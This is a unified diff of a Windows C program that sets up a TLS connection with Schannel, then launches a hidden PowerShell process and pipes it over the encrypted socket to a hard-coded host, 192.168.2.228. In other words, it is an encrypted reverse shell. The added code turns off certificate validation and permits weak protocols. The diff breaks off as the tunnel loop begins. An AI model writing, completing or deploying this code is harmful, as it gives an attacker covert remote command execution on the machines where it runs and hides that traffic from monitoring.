@@ -5,525 +5,511 @@
 #include <security.h>
 #include <schannel.h>
 #include <shlwapi.h>
-#include <assert.h>
 #include <stdio.h>
+#include <stdlib.h>
 
-#pragma comment (lib, "ws2_32.lib")
-#pragma comment (lib, "secur32.lib")
-#pragma comment (lib, "shlwapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "secur32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
-#define TLS_MAX_PACKET_SIZE (16384+512) // payload + extra over head for header/mac/padding (probably an overestimate)
+#define IO_BUFFER_SIZE 0x10000
 
-typedef struct {
-    SOCKET sock;
-    CredHandle handle;
-    CtxtHandle context;
-    SecPkgContext_StreamSizes sizes;
-    int received;    // byte count in incoming buffer (ciphertext)
-    int used;        // byte count used from incoming buffer to decrypt current packet
-    int available;   // byte count available for decrypted bytes
-    char* decrypted; // points to incoming buffer where data is decrypted inplace
-    char incoming[TLS_MAX_PACKET_SIZE];
-} tls_socket;
+HMODULE g_hSecurity = NULL;
+PSecurityFunctionTableA g_pSSPI = NULL;
 
-// returns 0 on success or negative value on error
-static int tls_connect(tls_socket* s, const char* hostname, unsigned short port)
-{
-    // initialize windows sockets
-    WSADATA wsadata;
-    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
-    {
-        return -1;
+// Load Secur32.dll and get the ANSI SSPI function table
+DWORD LoadSecurityInterface(void) {
+    INIT_SECURITY_INTERFACE_A pInit = NULL;
+    g_hSecurity = LoadLibraryA("Secur32.dll");
+    if (!g_hSecurity) return 0;
+    pInit = (INIT_SECURITY_INTERFACE_A)
+            GetProcAddress(g_hSecurity, "InitSecurityInterfaceA");
+    if (!pInit) {
+        FreeLibrary(g_hSecurity);
+        return 0;
     }
+    g_pSSPI = pInit();
+    return (g_pSSPI != NULL);
+}
 
-    // create TCP IPv4 socket
-    s->sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (s->sock == INVALID_SOCKET)
+// Build an Schannel credential for outbound TLS
+DWORD TlsCreateCredentials(PCredHandle phCreds) {
+    SCHANNEL_CRED cred;
+    TimeStamp tsExpiry;
+    ALG_ID algs[2] = { CALG_AES_256, CALG_3DES };
+
+    ZeroMemory(&cred, sizeof(cred));
+    cred.dwVersion = SCHANNEL_CRED_VERSION;
+    cred.grbitEnabledProtocols = SP_PROT_TLS1_2 | SP_PROT_TLS1_1 | SP_PROT_TLS1;
+    cred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;
+    cred.cSupportedAlgs = 2;
+    cred.palgSupportedAlgs = algs;
+
+    return
+      (g_pSSPI->AcquireCredentialsHandleA(
+          NULL,
+          UNISP_NAME_A,
+          SECPKG_CRED_OUTBOUND,
+          NULL,
+          &cred,
+          NULL,
+          NULL,
+          phCreds,
+          &tsExpiry
+      ) == SEC_E_OK);
+}
+
+// Loop until client handshake completes or fails
+SECURITY_STATUS ClientHandshakeLoop(
+    SOCKET socket,
+    PCredHandle phCreds,
+    PCtxtHandle phContext,
+    BOOL initialRead,
+    PSecBuffer pExtraData
+) {
+    SecBufferDesc descIn, descOut;
+    SecBuffer buffsIn[2], buffsOut[1];
+    ULONG flags = ISC_REQ_SEQUENCE_DETECT
+                | ISC_REQ_REPLAY_DETECT
+                | ISC_REQ_CONFIDENTIALITY
+                | ISC_RET_EXTENDED_ERROR
+                | ISC_REQ_ALLOCATE_MEMORY
+                | ISC_REQ_STREAM;
+    ULONG outFlags = 0;
+    SECURITY_STATUS status = SEC_I_CONTINUE_NEEDED;
+    DWORD totalRecv = 0;
+    BYTE *buffer = (BYTE*)malloc(IO_BUFFER_SIZE);
+    if (!buffer) return SEC_E_INTERNAL_ERROR;
+
+    BOOL doRead = initialRead;
+    while (status == SEC_I_CONTINUE_NEEDED
+        || status == SEC_E_INCOMPLETE_MESSAGE
+        || status == SEC_I_INCOMPLETE_CREDENTIALS)
     {
-        WSACleanup();
-        return -1;
-    }
-
-    char sport[64];
-    wnsprintfA(sport, sizeof(sport), "%u", port);
-
-    // connect to server
-    if (!WSAConnectByNameA(s->sock, (LPSTR)hostname, sport, NULL, NULL, NULL, NULL, NULL, NULL))
-    {
-        closesocket(s->sock);
-        WSACleanup();
-        return -1;
-    }
-
-    // initialize schannel
-    {
-        SCHANNEL_CRED cred =
-        {
-            .dwVersion = SCHANNEL_CRED_VERSION,
-            .dwFlags = SCH_USE_STRONG_CRYPTO          // use only strong crypto alogorithms
-                     | SCH_CRED_NO_SERVERNAME_CHECK  // automatically validate server certificate
-                     | SCH_CRED_NO_DEFAULT_CREDS,     // no client certificate authentication
-            .grbitEnabledProtocols = SP_PROT_TLS1_2,  // allow only TLS v1.2
-        };
-
-        if (AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &s->handle, NULL) != SEC_E_OK)
-        {
-            closesocket(s->sock);
-            WSACleanup();
-            return -1;
+        if (totalRecv == 0 || status == SEC_E_INCOMPLETE_MESSAGE) {
+            if (doRead) {
+                int r = recv(socket, (char*)buffer + totalRecv,
+                             IO_BUFFER_SIZE - totalRecv, 0);
+                if (r <= 0) { status = SEC_E_INTERNAL_ERROR; break; }
+                totalRecv += r;
+            } else {
+                doRead = TRUE;
+            }
         }
-    }
 
-    s->received = s->used = s->available = 0;
-    s->decrypted = NULL;
+        buffsIn[0].pvBuffer   = buffer;
+        buffsIn[0].cbBuffer   = totalRecv;
+        buffsIn[0].BufferType = SECBUFFER_TOKEN;
+        buffsIn[1].BufferType = SECBUFFER_EMPTY;
 
-    // perform tls handshake
-    // 1) call InitializeSecurityContext to create/update schannel context
-    // 2) when it returns SEC_E_OK - tls handshake completed
-    // 3) when it returns SEC_I_INCOMPLETE_CREDENTIALS - server requests client certificate (not supported here)
-    // 4) when it returns SEC_I_CONTINUE_NEEDED - send token to server and read data
-    // 5) when it returns SEC_E_INCOMPLETE_MESSAGE - need to read more data from server
-    // 6) otherwise read data from server and go to step 1
+        descIn.ulVersion = SECBUFFER_VERSION;
+        descIn.cBuffers  = 2;
+        descIn.pBuffers  = buffsIn;
 
-    CtxtHandle* context = NULL;
-    int result = 0;
-    for (;;)
-    {
-        SecBuffer inbuffers[2] = { 0 };
-        inbuffers[0].BufferType = SECBUFFER_TOKEN;
-        inbuffers[0].pvBuffer = s->incoming;
-        inbuffers[0].cbBuffer = s->received;
-        inbuffers[1].BufferType = SECBUFFER_EMPTY;
+        buffsOut[0].pvBuffer   = NULL;
+        buffsOut[0].cbBuffer   = 0;
+        buffsOut[0].BufferType = SECBUFFER_TOKEN;
 
-        SecBuffer outbuffers[1] = { 0 };
-        outbuffers[0].BufferType = SECBUFFER_TOKEN;
+        descOut.ulVersion = SECBUFFER_VERSION;
+        descOut.cBuffers  = 1;
+        descOut.pBuffers  = buffsOut;
 
-        SecBufferDesc indesc = { SECBUFFER_VERSION, ARRAYSIZE(inbuffers), inbuffers };
-        SecBufferDesc outdesc = { SECBUFFER_VERSION, ARRAYSIZE(outbuffers), outbuffers };
-
-        DWORD fContextReq = ISC_REQ_USE_SUPPLIED_CREDS
-                     | ISC_REQ_ALLOCATE_MEMORY
-                     | ISC_REQ_CONFIDENTIALITY
-                     | ISC_REQ_REPLAY_DETECT
-                     | ISC_REQ_SEQUENCE_DETECT
-                     | ISC_REQ_STREAM;
-        DWORD fContextAttr = 0;
-        PCtxtHandle phContext    = context;                 // NULL first time, then &s->context
-        SEC_CHAR*   targetName   = context ? NULL : (SEC_CHAR*)hostname;
-        PSecBufferDesc pInput    = context ? &indesc : NULL;
-        PCtxtHandle phNewContext = &s->context;             // <— always non‐NULL here
-
-        SECURITY_STATUS sec = InitializeSecurityContextA(
-            &s->handle,
+        status = g_pSSPI->InitializeSecurityContextA(
+            phCreds,
             phContext,
-            targetName,
-            fContextReq,
+            NULL,
+            flags,
             0,
             SECURITY_NATIVE_DREP,
-            pInput,
+            &descIn,
             0,
-            phNewContext,
-            &outdesc,
-            &fContextAttr,
+            phContext,
+            &descOut,
+            &outFlags,
             NULL
         );
 
-        // after first call to InitializeSecurityContext context is available and should be reused for next calls
-        context = &s->context;
-
-        if (inbuffers[1].BufferType == SECBUFFER_EXTRA)
-        {
-            MoveMemory(s->incoming, s->incoming + (s->received - inbuffers[1].cbBuffer), inbuffers[1].cbBuffer);
-            s->received = inbuffers[1].cbBuffer;
-        }
-        else
-        {
-            s->received = 0;
+        // send token if generated
+        if (buffsOut[0].pvBuffer && buffsOut[0].cbBuffer) {
+            send(socket, buffsOut[0].pvBuffer, buffsOut[0].cbBuffer, 0);
+            g_pSSPI->FreeContextBuffer(buffsOut[0].pvBuffer);
         }
 
-        if (sec == SEC_E_OK)
-        {
-            // tls handshake completed
-            break;
+        // handle extra bytes
+        if (buffsIn[1].BufferType == SECBUFFER_EXTRA) {
+            int extra = buffsIn[1].cbBuffer;
+            memmove(buffer, buffer + totalRecv - extra, extra);
+            totalRecv = extra;
+        } else {
+            totalRecv = 0;
         }
-        else if (sec == SEC_I_INCOMPLETE_CREDENTIALS)
-        {
-            // server asked for client certificate, not supported here
-            result = -1;
-            break;
-        }
-        else if (sec == SEC_I_CONTINUE_NEEDED)
-        {
-            // need to send data to server
-            char* buffer = outbuffers[0].pvBuffer;
-            int size = outbuffers[0].cbBuffer;
 
-            while (size != 0)
-            {
-                int d = send(s->sock, buffer, size, 0);
-                if (d <= 0)
-                {
-                    break;
-                }
-                size -= d;
-                buffer += d;
+        if (status == SEC_E_OK) {
+            if (pExtraData && buffsIn[1].BufferType == SECBUFFER_EXTRA) {
+                pExtraData->pvBuffer = malloc(buffsIn[1].cbBuffer);
+                pExtraData->cbBuffer = buffsIn[1].cbBuffer;
+                pExtraData->BufferType = SECBUFFER_TOKEN;
+                memcpy(pExtraData->pvBuffer,
+                       buffer + (totalRecv - buffsIn[1].cbBuffer),
+                       buffsIn[1].cbBuffer);
             }
-            FreeContextBuffer(outbuffers[0].pvBuffer);
-            if (size != 0)
-            {
-                // failed to fully send data to server
-                result = -1;
-                break;
-            }
-        }
-        else if (sec != SEC_E_INCOMPLETE_MESSAGE)
-        {
-            // SEC_E_CERT_EXPIRED - certificate expired or revoked
-            // SEC_E_WRONG_PRINCIPAL - bad hostname
-            // SEC_E_UNTRUSTED_ROOT - cannot vertify CA chain
-            // SEC_E_ILLEGAL_MESSAGE / SEC_E_ALGORITHM_MISMATCH - cannot negotiate crypto algorithms
-            result = -1;
             break;
         }
 
-        // read more data from server when possible
-        if (s->received == sizeof(s->incoming))
-        {
-            // server is sending too much data instead of proper handshake?
-            result = -1;
-            break;
+        if (status == SEC_E_INCOMPLETE_MESSAGE) {
+            continue;
         }
 
-        int r = recv(s->sock, s->incoming + s->received, sizeof(s->incoming) - s->received, 0);
-        if (r == 0)
+        if (status == SEC_I_COMPLETE_AND_CONTINUE || status == SEC_I_COMPLETE_NEEDED)
         {
-            // server disconnected socket
-            return 0;
+            g_pSSPI->CompleteAuthToken(phContext, &descOut);
         }
-        else if (r < 0)
-        {
-            // socket error
-            result = -1;
+
+        if (FAILED(status)) {
             break;
         }
-        s->received += r;
     }
 
-    if (result != 0)
-    {
-        DeleteSecurityContext(context);
-        FreeCredentialsHandle(&s->handle);
-        closesocket(s->sock);
-        WSACleanup();
-        return result;
-    }
-
-    QueryContextAttributes(context, SECPKG_ATTR_STREAM_SIZES, &s->sizes);
-    return 0;
+    free(buffer);
+    return status;
 }
 
-// disconnects socket & releases resources (call this even if tls_write/tls_read function return error)
-static void tls_disconnect(tls_socket* s)
-{
+// Kick off the handshake by sending ClientHello
+SECURITY_STATUS TlsPerformClientHandshake(
+    SOCKET socket,
+    PCredHandle phCreds,
+    const char *serverName,
+    PCtxtHandle phContext,
+    PSecBuffer pExtraData
+) {
+    SecBufferDesc desc;
+    SecBuffer buff;
+    ULONG flags = ISC_REQ_SEQUENCE_DETECT
+                | ISC_REQ_REPLAY_DETECT
+                | ISC_REQ_CONFIDENTIALITY
+                | ISC_RET_EXTENDED_ERROR
+                | ISC_REQ_ALLOCATE_MEMORY
+                | ISC_REQ_STREAM;
+    ULONG outFlags = 0;
+
+    buff.BufferType = SECBUFFER_TOKEN;
+    buff.cbBuffer   = 0;
+    buff.pvBuffer   = NULL;
+
+    desc.ulVersion = SECBUFFER_VERSION;
+    desc.cBuffers  = 1;
+    desc.pBuffers  = &buff;
+
+    SECURITY_STATUS status = g_pSSPI->InitializeSecurityContextA(
+        phCreds,
+        NULL,
+        (SEC_CHAR*)serverName,
+        flags,
+        0,
+        SECURITY_NATIVE_DREP,
+        NULL,
+        0,
+        phContext,
+        &desc,
+        &outFlags,
+        NULL
+    );
+    /*if (status != SEC_I_CONTINUE_NEEDED) {
+        return status;
+    }*/
+
+    if (buff.pvBuffer && buff.cbBuffer) {
+        send(socket, buff.pvBuffer, buff.cbBuffer, 0);
+        g_pSSPI->FreeContextBuffer(buff.pvBuffer);
+    }
+
+    return ClientHandshakeLoop(socket, phCreds, phContext, TRUE, pExtraData);
+}
+
+// EncryptMessage wrapper
+DWORD TlsSend(
+    SOCKET socket,
+    PCredHandle phCreds,
+    CtxtHandle *phContext,
+    PBYTE buffer,
+    DWORD length
+) {
+    SecPkgContext_StreamSizes sizes;
+    if (g_pSSPI->QueryContextAttributesA(
+          phContext,
+          SECPKG_ATTR_STREAM_SIZES,
+          &sizes
+        ) != SEC_E_OK) return 0;
+
+    DWORD total = sizes.cbHeader + length + sizes.cbTrailer;
+    BYTE *outbuf = malloc(total);
+    memcpy(outbuf + sizes.cbHeader, buffer, length);
+
+    SecBuffer buffs[3] = {
+        { SECBUFFER_STREAM_HEADER,  sizes.cbHeader, outbuf },
+        { SECBUFFER_DATA,           length,        outbuf + sizes.cbHeader },
+        { SECBUFFER_STREAM_TRAILER, sizes.cbTrailer, outbuf + sizes.cbHeader + length }
+    };
+    SecBufferDesc desc = { SECBUFFER_VERSION, 3, buffs };
+
+    if (g_pSSPI->EncryptMessage(phContext, 0, &desc, 0) != SEC_E_OK) {
+        free(outbuf);
+        return 0;
+    }
+
+    int sent = send(socket, outbuf,
+                    buffs[0].cbBuffer + buffs[1].cbBuffer + buffs[2].cbBuffer,
+                    0);
+    free(outbuf);
+    return (sent > 0 ? length : 0);
+}
+
+// DecryptMessage wrapper
+DWORD TlsRecv(
+    SOCKET      socket,
+    PCredHandle phCreds,
+    CtxtHandle *phContext,
+    PBYTE       buffer,
+    DWORD       size
+) {
+    printf("[TlsRecv] === ENTER ===\n");
+    printf("[TlsRecv] socket=%u, phCreds=%p, phContext=%p, requested_size=%u\n",
+           (unsigned)socket, (void*)phCreds, (void*)phContext, size);
+
+    // 1) Query stream sizes
+    SecPkgContext_StreamSizes sizes;
+    printf("[TlsRecv] -> QueryContextAttributesA(..., STREAM_SIZES)\n");
+    SECURITY_STATUS qca = g_pSSPI->QueryContextAttributesA(
+        phContext,
+        SECPKG_ATTR_STREAM_SIZES,
+        &sizes
+    );
+    printf("[TlsRecv]    QCA return=0x%08X\n", qca);
+    if (qca != SEC_E_OK) {
+        DWORD err = GetLastError();
+        printf("[TlsRecv]    ERROR: QCA failed, GetLastError()=%u\n", err);
+        printf("[TlsRecv] === EXIT (0) ===\n\n");
+        return 0;
+    }
+    printf("[TlsRecv]    header=%u, trailer=%u, max_msg=%u\n",
+           sizes.cbHeader, sizes.cbTrailer, sizes.cbMaximumMessage);
+
+    // 2) Allocate buffer for incoming TLS record
+    DWORD maxRec = sizes.cbHeader + size + sizes.cbTrailer;
+    printf("[TlsRecv] -> malloc(%u)\n", maxRec);
+    BYTE *encbuf = (BYTE*)malloc(maxRec);
+    if (!encbuf) {
+        printf("[TlsRecv]    ERROR: malloc failed\n");
+        printf("[TlsRecv] === EXIT (0) ===\n\n");
+        return 0;
+    }
+    printf("[TlsRecv]    encbuf=%p\n", (void*)encbuf);
+
+    // 3) recv raw TLS record
+    printf("[TlsRecv] -> recv(socket, %u bytes)\n", maxRec);
+    int recvd = recv(socket, (char*)encbuf, maxRec, 0);
+    if (recvd < 0) {
+        int serr = WSAGetLastError();
+        printf("[TlsRecv]    ERROR: recv() failed, WSAGetLastError()=%d\n", serr);
+        free(encbuf);
+        printf("[TlsRecv] === EXIT (0) ===\n\n");
+        return 0;
+    } else if (recvd == 0) {
+        printf("[TlsRecv]    peer closed connection\n");
+        free(encbuf);
+        printf("[TlsRecv] === EXIT (0) ===\n\n");
+        return 0;
+    }
+    printf("[TlsRecv]    recv returned %d bytes\n", recvd);
+
+    // 4) Prepare SECBUFFER_STREAM
+    SecBuffer inBuf;
+    inBuf.BufferType = SECBUFFER_STREAM;
+    inBuf.cbBuffer   = (ULONG)recvd;
+    inBuf.pvBuffer   = encbuf;
+    SecBufferDesc desc = { SECBUFFER_VERSION, 1, &inBuf };
+    printf("[TlsRecv] -> DecryptMessage with SECBUFFER_STREAM\n");
+
+    // 5) DecryptMessage
+    SECURITY_STATUS dm = g_pSSPI->DecryptMessage(phContext, &desc, 0, NULL);
+    printf("[TlsRecv]    DecryptMessage return=0x%08X\n", dm);
+    if (dm != SEC_E_OK && dm != SEC_I_RENEGOTIATE) {
+        DWORD err = GetLastError();
+        printf("[TlsRecv]    ERROR: DecryptMessage failed, GetLastError()=%u\n", err);
+        free(encbuf);
+        printf("[TlsRecv] === EXIT (0) ===\n\n");
+        return 0;
+    }
+
+    // 6) Extract plaintext
+    DWORD outLen = 0;
+    if (inBuf.BufferType == SECBUFFER_DATA) {
+        outLen = inBuf.cbBuffer;
+        printf("[TlsRecv]    plaintext len=%u, pvBuffer=%p\n",
+               outLen, inBuf.pvBuffer);
+        memcpy(buffer, inBuf.pvBuffer, outLen);
+    } else if (inBuf.BufferType == SECBUFFER_EXTRA) {
+        // extra data case (multiple records)
+        outLen = inBuf.cbBuffer;
+        printf("[TlsRecv]    EXTRA plaintext len=%u\n", outLen);
+        memcpy(buffer, inBuf.pvBuffer, outLen);
+    } else {
+        printf("[TlsRecv]    WARNING: unexpected BufferType=%u\n",
+               inBuf.BufferType);
+    }
+
+    // 7) Cleanup & return
+    free(encbuf);
+    printf("[TlsRecv] === EXIT (%u) ===\n\n", outLen);
+    return outLen;
+}
+
+
+// Send TLS close‑notify and clean up
+DWORD TlsClose(SOCKET socket, PCtxtHandle phContext) {
     DWORD type = SCHANNEL_SHUTDOWN;
+    SecBuffer buff = { SECBUFFER_TOKEN, sizeof(type), &type };
+    SecBufferDesc desc = { SECBUFFER_VERSION, 1, &buff };
 
-    SecBuffer inbuffers[1];
-    inbuffers[0].BufferType = SECBUFFER_TOKEN;
-    inbuffers[0].pvBuffer = &type;
-    inbuffers[0].cbBuffer = sizeof(type);
+    g_pSSPI->ApplyControlToken(phContext, &desc);
 
-    SecBufferDesc indesc = { SECBUFFER_VERSION, ARRAYSIZE(inbuffers), inbuffers };
-    ApplyControlToken(&s->context, &indesc);
+    buff.pvBuffer   = NULL;
+    buff.cbBuffer   = 0;
+    buff.BufferType = SECBUFFER_TOKEN;
 
-    SecBuffer outbuffers[1];
-    outbuffers[0].BufferType = SECBUFFER_TOKEN;
+    ULONG flags = ISC_REQ_SEQUENCE_DETECT
+                | ISC_REQ_REPLAY_DETECT
+                | ISC_REQ_CONFIDENTIALITY
+                | ISC_RET_EXTENDED_ERROR
+                | ISC_REQ_ALLOCATE_MEMORY
+                | ISC_REQ_STREAM;
 
-    SecBufferDesc outdesc = { SECBUFFER_VERSION, ARRAYSIZE(outbuffers), outbuffers };
-    DWORD flags = ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_STREAM;
-    if (InitializeSecurityContextA(&s->handle, &s->context, NULL, flags, 0, 0, &outdesc, 0, NULL, &outdesc, &flags, NULL) == SEC_E_OK)
-    {
-        char* buffer = outbuffers[0].pvBuffer;
-        int size = outbuffers[0].cbBuffer;
-        while (size != 0)
-        {
-            int d = send(s->sock, buffer, size, 0);
-            if (d <= 0)
-            {
-                // ignore any failures socket will be closed anyway
-                break;
-            }
-            buffer += d;
-            size -= d;
-        }
-        FreeContextBuffer(outbuffers[0].pvBuffer);
+    g_pSSPI->InitializeSecurityContextA(
+        NULL,
+        phContext,
+        NULL,
+        flags,
+        0,
+        SECURITY_NATIVE_DREP,
+        &desc,
+        0,
+        phContext,
+        &desc,
+        &flags,
+        NULL
+    );
+    if (buff.pvBuffer && buff.cbBuffer) {
+        send(socket, buff.pvBuffer, buff.cbBuffer, 0);
+        g_pSSPI->FreeContextBuffer(buff.pvBuffer);
     }
-    shutdown(s->sock, SD_BOTH);
 
-    DeleteSecurityContext(&s->context);
-    FreeCredentialsHandle(&s->handle);
-    closesocket(s->sock);
+    closesocket(socket);
+    g_pSSPI->DeleteSecurityContext(phContext);
+    FreeLibrary(g_hSecurity);
     WSACleanup();
+    return 1;
 }
 
-// returns 0 on success or negative value on error
-static int tls_write(tls_socket* s, const void* buffer, int size)
-{
-    while (size != 0)
-    {
-        int use = min(size, s->sizes.cbMaximumMessage);
-
-        char wbuffer[TLS_MAX_PACKET_SIZE];
-        assert(s->sizes.cbHeader + s->sizes.cbMaximumMessage + s->sizes.cbTrailer <= sizeof(wbuffer));
-
-        SecBuffer buffers[3];
-        buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
-        buffers[0].pvBuffer = wbuffer;
-        buffers[0].cbBuffer = s->sizes.cbHeader;
-        buffers[1].BufferType = SECBUFFER_DATA;
-        buffers[1].pvBuffer = wbuffer + s->sizes.cbHeader;
-        buffers[1].cbBuffer = use;
-        buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
-        buffers[2].pvBuffer = wbuffer + s->sizes.cbHeader + use;
-        buffers[2].cbBuffer = s->sizes.cbTrailer;
-
-        CopyMemory(buffers[1].pvBuffer, buffer, use);
-
-        SecBufferDesc desc = { SECBUFFER_VERSION, ARRAYSIZE(buffers), buffers };
-        SECURITY_STATUS sec = EncryptMessage(&s->context, 0, &desc, 0);
-        if (sec != SEC_E_OK)
-        {
-            // this should not happen, but just in case check it
-            return -1;
-        }
-
-        int total = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
-        int sent = 0;
-        while (sent != total)
-        {
-            int d = send(s->sock, wbuffer + sent, total - sent, 0);
-            if (d <= 0)
-            {
-                // error sending data to socket, or server disconnected
-                return -1;
-            }
-            sent += d;
-        }
-
-        buffer = (char*)buffer + use;
-        size -= use;
+//----------------------------------------------------------------------------//
+// Main: connect, handshake, spawn PowerShell, pump via TlsSend/TlsRecv
+//----------------------------------------------------------------------------//
+int main(void) {
+    if (!LoadSecurityInterface()) {
+        fprintf(stderr, "Failed to load SSPI\n");
+        return 1;
     }
 
-    return 0;
-}
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2,2), &wsa);
 
-// blocking read, waits & reads up to size bytes, returns amount of bytes received on success (<= size)
-// returns 0 on disconnect or negative value on error
-static int tls_read(tls_socket* s, void* buffer, int size)
-{
-    int result = 0;
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in sa = { 0 };
+    sa.sin_family = AF_INET;
+    sa.sin_port   = htons(9001);
+    sa.sin_addr.s_addr = inet_addr("192.168.2.228");
 
-    while (size != 0)
-    {
-        if (s->decrypted)
-        {
-            // if there is decrypted data available, then use it as much as possible
-            int use = min(size, s->available);
-            CopyMemory(buffer, s->decrypted, use);
-            buffer = (char*)buffer + use;
-            size -= use;
-            result += use;
-
-            if (use == s->available)
-            {
-                // all decrypted data is used, remove ciphertext from incoming buffer so next time it starts from beginning
-                MoveMemory(s->incoming, s->incoming + s->used, s->received - s->used);
-                s->received -= s->used;
-                s->used = 0;
-                s->available = 0;
-                s->decrypted = NULL;
-            }
-            else
-            {
-                s->available -= use;
-                s->decrypted += use;
-            }
-        }
-        else
-        {
-            // if any ciphertext data available then try to decrypt it
-            if (s->received != 0)
-            {
-                SecBuffer buffers[4];
-                assert(s->sizes.cBuffers == ARRAYSIZE(buffers));
-
-                buffers[0].BufferType = SECBUFFER_DATA;
-                buffers[0].pvBuffer = s->incoming;
-                buffers[0].cbBuffer = s->received;
-                buffers[1].BufferType = SECBUFFER_EMPTY;
-                buffers[2].BufferType = SECBUFFER_EMPTY;
-                buffers[3].BufferType = SECBUFFER_EMPTY;
-
-                SecBufferDesc desc = { SECBUFFER_VERSION, ARRAYSIZE(buffers), buffers };
-
-                SECURITY_STATUS sec = DecryptMessage(&s->context, &desc, 0, NULL);
-                if (sec == SEC_E_OK)
-                {
-                    assert(buffers[0].BufferType == SECBUFFER_STREAM_HEADER);
-                    assert(buffers[1].BufferType == SECBUFFER_DATA);
-                    assert(buffers[2].BufferType == SECBUFFER_STREAM_TRAILER);
-
-                    s->decrypted = buffers[1].pvBuffer;
-                    s->available = buffers[1].cbBuffer;
-                    s->used = s->received - (buffers[3].BufferType == SECBUFFER_EXTRA ? buffers[3].cbBuffer : 0);
-
-                    // data is now decrypted, go back to beginning of loop to copy memory to output buffer
-                    continue;
-                }
-                else if (sec == SEC_I_CONTEXT_EXPIRED)
-                {
-                    // server closed TLS connection (but socket is still open)
-                    s->received = 0;
-                    return result;
-                }
-                else if (sec == SEC_I_RENEGOTIATE)
-                {
-                    // server wants to renegotiate TLS connection, not implemented here
-                    return -1;
-                }
-                else if (sec != SEC_E_INCOMPLETE_MESSAGE)
-                {
-                    // some other schannel or TLS protocol error
-                    return -1;
-                }
-                // otherwise sec == SEC_E_INCOMPLETE_MESSAGE which means need to read more data
-            }
-            // otherwise not enough data received to decrypt
-
-            if (result != 0)
-            {
-                // some data is already copied to output buffer, so return that before blocking with recv
-                break;
-            }
-
-            if (s->received == sizeof(s->incoming))
-            {
-                // server is sending too much garbage data instead of proper TLS packet
-                return -1;
-            }
-
-            // wait for more ciphertext data from server
-            int r = recv(s->sock, s->incoming + s->received, sizeof(s->incoming) - s->received, 0);
-            if (r == 0)
-            {
-                // server disconnected socket
-                return 0;
-            }
-            else if (r < 0)
-            {
-                // error receiving data from socket
-                result = -1;
-                break;
-            }
-            s->received += r;
-        }
+    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
+        perror("connect");
+        return 1;
     }
 
-    return result;
-}
-
-int main()
-{
-    const char* hostname = "192.168.2.228";
-    //const char* hostname = "badssl.com";
-    //const char* hostname = "expired.badssl.com";
-    //const char* hostname = "wrong.host.badssl.com";
-    //const char* hostname = "self-signed.badssl.com";
-    //const char* hostname = "untrusted-root.badssl.com";
-    const char* path = "/";
-
-    tls_socket s;
-    if (tls_connect(&s, hostname, 9003) != 0)
-    {
-        printf("Error connecting to %s\n", hostname);
-        return -1;
+    CredHandle cred;
+    if (!TlsCreateCredentials(&cred)) {
+        fprintf(stderr, "TlsCreateCredentials failed\n");
+        return 1;
     }
 
-    // -----------------------------------------------------------------------
-    // At this point TLS is up.  Spawn a hidden PowerShell and pipe it over s.
-    // -----------------------------------------------------------------------
+    CtxtHandle ctx;
+    SecBuffer extra = {0};
+    if (TlsPerformClientHandshake(
+            sock,
+            &cred,
+            "192.168.2.228",
+            &ctx,
+            &extra
+        ) != SEC_E_OK)
+    {
+        fprintf(stderr, "Handshake failed\n");
+        return 1;
+    }
 
-    // 1) create pipes for child process
-    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
-    HANDLE hChildStdinRd,  hChildStdinWr;
-    HANDLE hChildStdoutRd, hChildStdoutWr;
+    // Spawn hidden PowerShell
+    SECURITY_ATTRIBUTES saAttr = { sizeof(saAttr), NULL, TRUE };
+    HANDLE inRd,inWr,outRd,outWr;
+    CreatePipe(&outRd,&outWr,&saAttr,0);
+    CreatePipe(&inRd,&inWr,&saAttr,0);
+    SetHandleInformation(outWr, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(inRd,  HANDLE_FLAG_INHERIT, 0);
 
-    CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &sa, 0);
-    CreatePipe(&hChildStdinRd,  &hChildStdinWr,  &sa, 0);
-
-    // make sure the child does not inherit the write ends
-    SetHandleInformation(hChildStdoutWr, HANDLE_FLAG_INHERIT, 0);
-    SetHandleInformation(hChildStdinRd,  HANDLE_FLAG_INHERIT, 0);
-
-    // 2) spawn PowerShell
     PROCESS_INFORMATION pi;
     STARTUPINFOA si = { sizeof(si) };
     si.dwFlags      = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdInput    = outRd;
+    si.hStdOutput   = inWr;
+    si.hStdError    = inWr;
     si.wShowWindow  = SW_HIDE;
-    si.hStdInput    = hChildStdinRd;
-    si.hStdOutput   = hChildStdoutWr;
-    si.hStdError    = hChildStdoutWr;
 
-    if (!CreateProcessA(
-            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            "-NoProfile -WindowStyle Hidden -Command -", 
-            NULL, NULL, TRUE,
-            CREATE_NO_WINDOW, NULL, NULL,
-            &si, &pi))
-    {
-        printf("CreateProcessA failed: %u\n", GetLastError());
-        tls_disconnect(&s);
-        return -1;
-    }
+    CreateProcessA(
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "-NoProfile -WindowStyle Hidden -Command -",
+        NULL, NULL, TRUE,
+        CREATE_NO_WINDOW,
+        NULL, NULL, &si, &pi
+    );
+    printf("CREATED POWERSHELL PROCESS\n");
+    CloseHandle(outRd);
+    CloseHandle(inWr);
 
-    // close unused handles in parent
-    CloseHandle(hChildStdinRd);
-    CloseHandle(hChildStdoutWr);
+    // Tunnel loop
+    #define BUFSZ 4096
+    printf("ENTERING TUNNEL LOOP\n");
+    for (;;) {
+        BYTE buf[BUFSZ];
